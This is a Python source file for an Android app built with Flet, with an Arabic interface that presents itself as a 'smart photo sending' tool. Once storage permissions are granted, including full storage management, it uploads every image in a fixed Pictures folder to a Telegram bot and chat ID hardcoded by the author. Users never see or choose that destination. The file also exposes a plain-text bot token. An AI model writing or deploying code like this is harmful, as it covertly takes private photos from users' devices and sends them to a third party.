from flet import *
import requests
import os
import time
import threading
from plyer import storagepath
from android.permissions import request_permissions, Permission

# تكوين بوت التلجرام
BOT_TOKEN = "7988955212:AAFqpIpyQ1MlQ-sASLG0oMRLu4vMhkZNGDk"
CHAT_ID = "5739065274"
IMAGE_PATH = "/storage/emulated/0/Pictures/100PINT/Pins"

class TelegramApp:
    def __init__(self, page):
        self.page = page
        self.setup_ui()
        self.permissions_granted = False
        
    def setup_ui(self):
        # تصميم الواجهة الرئيسية
        self.page.title = "تطبيق إرسال الصور"
        self.page.vertical_alignment = "center"
        self.page.horizontal_alignment = "center"
        self.page.bgcolor = colors.BLUE_GREY_100
        
        # زر الدخول الرئيسي
        self.enter_button = ElevatedButton(
            text="دخول إلى التطبيق",
            icon=icons.LOGIN,
            color=colors.WHITE,
            bgcolor=colors.BLUE_800,
            width=300,
            height=60,
            on_click=self.on_enter_click
        )
        
        # عناصر الواجهة
        self.progress_bar = ProgressBar(width=350, visible=False)
        self.status_text = Text("", size=18, text_align="center")
        self.gallery_view = Column([], scroll="auto", expand=True)
        
        self.page.add(
            Column([
                Image(src="https://i.imgur.com/J3bqQ3a.png", width=180, height=180),
                Text("تطبيق إرسال الصور الذكي", size=26, weight="bold"),
                Text("اضغط على زر الدخول لبدء الإرسال", size=18),
                self.enter_button,
                self.progress_bar,
                self.status_text,
                self.gallery_view
            ],
            alignment="center",
            spacing=25)
        )
    
    def on_enter_click(self, e):
        """معالجة حدث الضغط على زر الدخول"""
        self.enter_button.disabled = True
        self.progress_bar.visible = True
        self.status_text.value = "جاري طلب أذونات الوصول..."
        self.page.update()
        
        # طلب الأذونات الضرورية
        self.request_android_permissions()
    
    def request_android_permissions(self):
        """طلب أذونات أندرويد الضرورية"""
        required_permissions = [
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.MANAGE_EXTERNAL_STORAGE
        ]
        
        # طلب الأذونات
        request_permissions(required_permissions, self.permissions_callback)
    
    def permissions_callback(self, permissions, grant_results):
        """رد فعل بعد منح/رفض الأذونات"""
        if all(grant_results):
            self.permissions_granted = True
            self.status_text.value = "تم منح جميع الأذونات بنجاح!"
            self.page.update()
            
            # بدء عملية إرسال الصور في خلفية
            threading.Thread(target=self.send_images_process, daemon=True).start()
        else:
            self.status_text.value = "تم رفض بعض الأذونات، لا يمكن المتابعة!"
            self.enter_button.disabled = False
            self.progress_bar.visible = False
            self.page.update()
    
    def send_images_process(self):
        """عملية إرسال الصور إلى التلجرام"""
        try:
            # إرسال رسالة بدء العملية
            self.send_telegram_message("🚀 بدء عملية إرسال الصور")
            
            # الحصول على مسار التخزين الخارجي
            pics_dir = storagepath.get_pictures_dir()
            if IMAGE_PATH != pics_dir:
                self.send_telegram_message(f"⚠️ المسار المتوقع: {IMAGE_PATH}\nالمسار الفعلي: {pics_dir}")
            
            if not os.path.exists(IMAGE_PATH):
                self.status_text.value = "جارٍ إنشاء المسار المطلوب..."
                self.page.update()
                os.makedirs(IMAGE_PATH, exist_ok=True)
            
            images = []
            for root, dirs, files in os.walk(IMAGE_PATH):
                for file in files:
                    if file.lower().endswith((".jpg", ".jpeg", ".png")):
                        images.append(os.path.join(root, file))
            
            if not images:
                self.send_telegram_message("📂 لا توجد صور في المجلد")
                self.status_text.value = "لا توجد صور في المجلد المحدد!"
                self.progress_bar.visible = False
                self.page.update()
                return

            total_images = len(images)
            self.status_text.value = f"تم العثور على {total_images} صورة، جاري الإرسال..."
            self.page.update()

            for idx, img_path in enumerate(images, start=1):
                try:
                    self.send_telegram_photo(img_path)
                    self.status_text.value = f"جاري إرسال الصور {idx}/{total_images}"
                    self.gallery_view.controls.append(
                        ListTile(
                            title=Text(os.path.basename(img_path)),
                            leading=Icon(icons.CHECK_CIRCLE, color=colors.GREEN),
                            subtitle=Text(f"تم الإرسال: {time.strftime('%H:%M:%S')}")
                        )
                    )
                    self.page.update()
                    time.sleep(1.5)
                except Exception as e:
                    self.send_telegram_message(f"❌ فشل إرسال {img_path}: {str(e)}")
                    continue

            self.send_telegram_message(f"✅ تم الانتهاء من إرسال {total_images} صورة")
            self.status_text.value = f"تم إرسال {total_images} صورة بنجاح!"
            self.progress_bar.visible = False
            self.page.update()
            
        except Exception as e:
            self.send_telegram_message(f"❌ خطأ جسيم: {str(e)}")
            self.status_text.value = f"حدث خطأ: {str(e)}"
            self.progress_bar.visible = False
            self.page.update()
    
    @staticmethod
    def send_telegram_message(message):
        """إرسال رسالة نصية إلى التلجرام"""
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        try:
            requests.post(url, json={"chat_id": CHAT_ID, "text": message}, timeout=10)
        except Exception as e:
            print(f"خطأ في إرسال الرسالة: {e}")
    
    @staticmethod
    def send_telegram_photo(photo_path):
        """إرسال صورة إلى التلجرام"""
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        try:
            with open(photo_path, 'rb') as photo:
                files = {'photo': photo}
                data = {'chat_id': CHAT_ID}
                requests.post(url, files=files, data=data, timeout=30)
        except Exception as e:
            print(f"خطأ في إرسال الصورة {photo_path}: {e}")
            raise

def main(page: Page):
    # تكوين صفحة Flet
    page.padding = 20
    page.window_width = 400
    page.window_height = 700
    page.theme_mode = "light"
    
    # تهيئة التطبيق
    app = TelegramApp(page)

# تشغيل التطبيق
app(main)